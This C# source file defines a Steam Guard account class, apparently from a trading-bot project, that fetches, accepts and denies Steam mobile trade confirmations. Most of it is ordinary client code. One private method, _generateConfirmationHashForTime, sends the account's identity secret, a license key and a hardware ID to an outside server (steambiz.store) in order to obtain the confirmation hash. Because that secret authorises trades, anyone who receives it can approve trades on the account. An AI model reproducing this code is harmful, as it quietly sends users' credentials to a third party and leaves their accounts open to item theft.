namespace SteamAutoMarket.Steam.Auth
{
    using System;
    using System.Collections.Generic;
    using System.Collections.Specialized;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Threading.Tasks;

    using Newtonsoft.Json;

    public class SteamGuardAccount
    {
        private static readonly byte[] steamGuardCodeTranslations =
            {
                50, 51, 52, 53, 54, 55, 56, 57, 66, 67, 68, 70, 71, 72, 74, 75, 77, 78, 80, 81, 82, 84, 86, 87, 88, 89
            };

        [JsonProperty("account_name")]
        public string AccountName { get; set; }

        [JsonProperty("device_id")]
        public string DeviceID { get; set; }

        /// <summary>
        /// Set to true if the authenticator has actually been applied to the account.
        /// </summary>
        [JsonProperty("fully_enrolled")]
        public bool FullyEnrolled { get; set; }

        [JsonProperty("identity_secret")]
        public string IdentitySecret { get; set; }

        [JsonProperty("revocation_code")]
        public string RevocationCode { get; set; }

        [JsonProperty("secret_1")]
        public string Secret1 { get; set; }

        [JsonProperty("serial_number")]
        public string SerialNumber { get; set; }

        [JsonProperty("server_time")]
        public long ServerTime { get; set; }

        public SessionData Session { get; set; }

        [JsonProperty("shared_secret")]
        public string SharedSecret { get; set; }

        [JsonProperty("status")]
        public int Status { get; set; }

        [JsonProperty("token_gid")]
        public string TokenGID { get; set; }

        [JsonProperty("uri")]
        public string URI { get; set; }

        public bool AcceptConfirmation(Confirmation conf)
        {
            return this._sendConfirmationAjax(conf, "allow");
        }

        public bool AcceptMultipleConfirmations(Confirmation[] confs)
        {
            return this._sendMultiConfirmationAjax(confs, "allow");
        }

        public bool DeactivateAuthenticator(int scheme = 2)
        {
            var postData = new NameValueCollection
                               {
                                   { "steamid", this.Session.SteamID.ToString() },
                                   { "steamguard_scheme", scheme.ToString() },
                                   { "revocation_code", this.RevocationCode },
                                   { "access_token", this.Session.OAuthToken }
                               };

            try
            {
                var response = SteamWeb.MobileLoginRequest(
                    APIEndpoints.STEAMAPI_BASE + "/ITwoFactorService/RemoveAuthenticator/v0001",
                    "POST",
                    postData);
                var removeResponse = JsonConvert.DeserializeObject<RemoveAuthenticatorResponse>(response);

                if (removeResponse == null || removeResponse.Response == null || !removeResponse.Response.Success)
                    return false;
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool DenyConfirmation(Confirmation conf)
        {
            return this._sendConfirmationAjax(conf, "cancel");
        }

        public bool DenyMultipleConfirmations(Confirmation[] confs)
        {
            return this._sendMultiConfirmationAjax(confs, "cancel");
        }

        public Confirmation[] FetchConfirmations()
        {
            var url = this.GenerateConfirmationURL();

            var cookies = new CookieContainer();
            this.Session.AddCookies(cookies);

            var response = SteamWeb.Request(url, "GET", string.Empty, cookies);

            /*So you're going to see this abomination and you're going to be upset.
              It's understandable. But the thing is, regex for HTML -- while awful -- makes this way faster than parsing a DOM, plus we don't need another library.
              And because the data is always in the same place and same format... It's not as if we're trying to naturally understand HTML here. Just extract strings.
              I'm sorry. */
            var confRegex = new Regex(
                "<div class=\"mobileconf_list_entry\" id=\"conf[0-9]+\" data-confid=\"(\\d+)\" data-key=\"(\\d+)\" data-type=\"(\\d+)\" data-creator=\"(\\d+)\"");

            if (response == null || !confRegex.IsMatch(response))
            {
                if (response == null || !response.Contains("<div>Nothing to confirm</div>"))
                {
                    throw new SteamRateLimitedException();
                }

                return new Confirmation[0];
            }

            var confirmations = confRegex.Matches(response);

            var ret = new List<Confirmation>();
            foreach (Match confirmation in confirmations)
            {
                if (confirmation.Groups.Count != 5) continue;

                if (!ulong.TryParse(confirmation.Groups[1].Value, out var confID)
                    || !ulong.TryParse(confirmation.Groups[2].Value, out var confKey)
                    || !int.TryParse(confirmation.Groups[3].Value, out var confType) || !ulong.TryParse(
                        confirmation.Groups[4].Value,
                        out var confCreator))
                {
                    continue;
                }

                ret.Add(new Confirmation(confID, confKey, confType, confCreator));
            }

            return ret.ToArray();
        }

        public async Task<Confirmation[]> FetchConfirmationsAsync()
        {
            var url = this.GenerateConfirmationURL();

            var cookies = new CookieContainer();
            this.Session.AddCookies(cookies);

            var response = await SteamWeb.RequestAsync(url, "GET", null, cookies);

            /*So you're going to see this abomination and you're going to be upset.
                          It's understandable. But the thing is, regex for HTML -- while awful -- makes this way faster than parsing a DOM, plus we don't need another library.
                          And because the data is always in the same place and same format... It's not as if we're trying to naturally understand HTML here. Just extract strings.
                          I'm sorry. */
            var confRegex = new Regex(
                "<div class=\"mobileconf_list_entry\" id=\"conf[0-9]+\" data-confid=\"(\\d+)\" data-key=\"(\\d+)\" data-type=\"(\\d+)\" data-creator=\"(\\d+)\"");

            if (response == null || !confRegex.IsMatch(response))
            {
                if (response == null || !response.Contains("<div>Nothing to confirm</div>"))
                {
                    throw new SteamRateLimitedException();
                }

                return new Confirmation[0];
            }

            var confirmations = confRegex.Matches(response);

            var ret = new List<Confirmation>();
            foreach (Match confirmation in confirmations)
            {
                if (confirmation.Groups.Count != 5) continue;

                if (!ulong.TryParse(confirmation.Groups[1].Value, out var confID)
                    || !ulong.TryParse(confirmation.Groups[2].Value, out var confKey)
                    || !int.TryParse(confirmation.Groups[3].Value, out var confType) || !ulong.TryParse(
                        confirmation.Groups[4].Value,
                        out var confCreator))
                {
                    continue;
                }

                ret.Add(new Confirmation(confID, confKey, confType, confCreator));
            }

            return ret.ToArray();
        }

        public string GenerateConfirmationQueryParams(string tag)
        {
            if (string.IsNullOrEmpty(this.DeviceID))
                throw new ArgumentException("Device ID is not present");

            var queryParams = this.GenerateConfirmationQueryParamsAsNVC(tag);

            return "p=" + queryParams["p"] + "&a=" + queryParams["a"] + "&k=" + queryParams["k"] + "&t="
                   + queryParams["t"] + "&m=android&tag=" + queryParams["tag"];
        }

        public NameValueCollection GenerateConfirmationQueryParamsAsNVC(string tag)
        {
            if (string.IsNullOrEmpty(this.DeviceID))
                throw new ArgumentException("Device ID is not present");

            var time = TimeAligner.GetSteamTime();

            var ret = new NameValueCollection
                          {
                              { "p", this.DeviceID },
                              { "a", this.Session.SteamID.ToString() },
                              { "k", this._generateConfirmationHashForTime(time, tag, this.IdentitySecret) },
                              { "t", time.ToString() },
                              { "m", "android" },
                              { "tag", tag }
                          };

            return ret;
        }

        public string GenerateConfirmationURL(string tag = "conf")
        {
            var endpoint = APIEndpoints.COMMUNITY_BASE + "/mobileconf/conf?";
            var queryString = this.GenerateConfirmationQueryParams(tag);
            return endpoint + queryString;
        }

        /// <summary>
        /// Deprecated. Simply returns conf.Creator.
        /// </summary>
        /// <param name="conf"></param>
        /// <returns>The Creator field of conf</returns>
        public long GetConfirmationTradeOfferID(Confirmation conf)
        {
            if (conf.ConfType != Confirmation.ConfirmationType.Trade)
                throw new ArgumentException("conf must be a trade confirmation.");

            return (long)conf.Creator;
        }

        /// <summary>
        /// Refreshes the Steam session. Necessary to perform confirmations if your session has expired or changed.
        /// </summary>
        /// <returns></returns>
        public bool RefreshSession()
        {
            var url = APIEndpoints.MOBILEAUTH_GETWGTOKEN;
            var postData = new NameValueCollection { { "access_token", this.Session.OAuthToken } };

            string response = null;
            try
            {
                response = SteamWeb.Request(url, "POST", postData);
            }
            catch (WebException)
            {
                return false;
            }

            if (response == null) return false;

            try
            {
                var refreshResponse = JsonConvert.DeserializeObject<RefreshSessionDataResponse>(response);
                if (refreshResponse == null || refreshResponse.Response == null
                                            || string.IsNullOrEmpty(refreshResponse.Response.Token))
                    return false;

                var token = this.Session.SteamID + "%7C%7C" + refreshResponse.Response.Token;
                var tokenSecure = this.Session.SteamID + "%7C%7C" + refreshResponse.Response.TokenSecure;

                this.Session.SteamLogin = token;
                this.Session.SteamLoginSecure = tokenSecure;
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Refreshes the Steam session. Necessary to perform confirmations if your session has expired or changed.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> RefreshSessionAsync()
        {
            var url = APIEndpoints.MOBILEAUTH_GETWGTOKEN;
            var postData = new NameValueCollection { { "access_token", this.Session.OAuthToken } };

            string response = null;
            try
            {
                response = await SteamWeb.RequestAsync(url, "POST", postData);
            }
            catch (WebException)
            {
                return false;
            }

            if (response == null) return false;

            try
            {
                var refreshResponse = JsonConvert.DeserializeObject<RefreshSessionDataResponse>(response);
                if (refreshResponse == null || refreshResponse.Response == null
                                            || string.IsNullOrEmpty(refreshResponse.Response.Token))
                    return false;

                var token = this.Session.SteamID + "%7C%7C" + refreshResponse.Response.Token;
                var tokenSecure = this.Session.SteamID + "%7C%7C" + refreshResponse.Response.TokenSecure;

                this.Session.SteamLogin = token;
                this.Session.SteamLoginSecure = tokenSecure;
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private string _generateConfirmationHashForTime(long time, string tag, string identitySecret)
        {
            using (var wb = new WebClient())
            {
                var response = wb.UploadString(
                    "https://www.steambiz.store/api/gconfhash",
                    $"{identitySecret},{tag},{time},{SteamManager.LicenseKey},{SteamManager.HwId}");
                return JsonConvert.DeserializeObject<IDictionary<string, string>>(response)["result_0x23432"];
            }
        }

        private ConfirmationDetailsResponse _getConfirmationDetails(Confirmation conf)
        {
            var url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/details/" + conf.ID + "?";
            var queryString = this.GenerateConfirmationQueryParams("details");
            url += queryString;

            var cookies = new CookieContainer();
            this.Session.AddCookies(cookies);
            var referer = this.GenerateConfirmationURL();

            var response = SteamWeb.Request(url, "GET", string.Empty, cookies, null);
            if (string.IsNullOrEmpty(response)) return null;

            var confResponse = JsonConvert.DeserializeObject<ConfirmationDetailsResponse>(response);
            if (confResponse == null) return null;
            return confResponse;
        }

        private bool _sendConfirmationAjax(Confirmation conf, string op)
        {
            var url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/ajaxop";
            var queryString = "?op=" + op + "&";
            queryString += this.GenerateConfirmationQueryParams(op);
            queryString += "&cid=" + conf.ID + "&ck=" + conf.Key;
            url += queryString;

            var cookies = new CookieContainer();
            this.Session.AddCookies(cookies);
            var referer = this.GenerateConfirmationURL();

            var response = SteamWeb.Request(url, "GET", string.Empty, cookies, null);
            if (response == null) return false;

            var confResponse = JsonConvert.DeserializeObject<SendConfirmationResponse>(response);
            return confResponse.Success;
        }

        private bool _sendMultiConfirmationAjax(Confirmation[] confs, string op)
        {
            var url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/multiajaxop";

            var query = "op=" + op + "&" + this.GenerateConfirmationQueryParams(op);
            foreach (var conf in confs)
            {
                query += "&cid[]=" + conf.ID + "&ck[]=" + conf.Key;
            }

            var cookies = new CookieContainer();
            this.Session.AddCookies(cookies);
            var referer = this.GenerateConfirmationURL();

            var response = SteamWeb.Request(url, "POST", query, cookies, referer: referer);
            if (response == null) return false;

            var confResponse = JsonConvert.DeserializeObject<SendConfirmationResponse>(response);
            return confResponse.Success;
        }

        public class WGTokenExpiredException : Exception
        {
        }

        public class SteamRateLimitedException : Exception
        {
        }

        private class ConfirmationDetailsResponse
        {
            [JsonProperty("html")]
            public string HTML { get; set; }

            [JsonProperty("success")]
            public bool Success { get; set; }
        }

        private class RefreshSessionDataResponse
        {
            [JsonProperty("response")]
            public RefreshSessionDataInternalResponse Response { get; set; }

            internal class RefreshSessionDataInternalResponse
            {
                [JsonProperty("token")]
                public string Token { get; set; }

                [JsonProperty("token_secure")]
                public string TokenSecure { get; set; }
            }
        }

        private class RemoveAuthenticatorResponse
        {
            [JsonProperty("response")]
            public RemoveAuthenticatorInternalResponse Response { get; set; }

            internal class RemoveAuthenticatorInternalResponse
            {
                [JsonProperty("success")]
                public bool Success { get; set; }
            }
        }

        private class SendConfirmationResponse
        {
            [JsonProperty("success")]
            public bool Success { get; set; }
        }
    }
}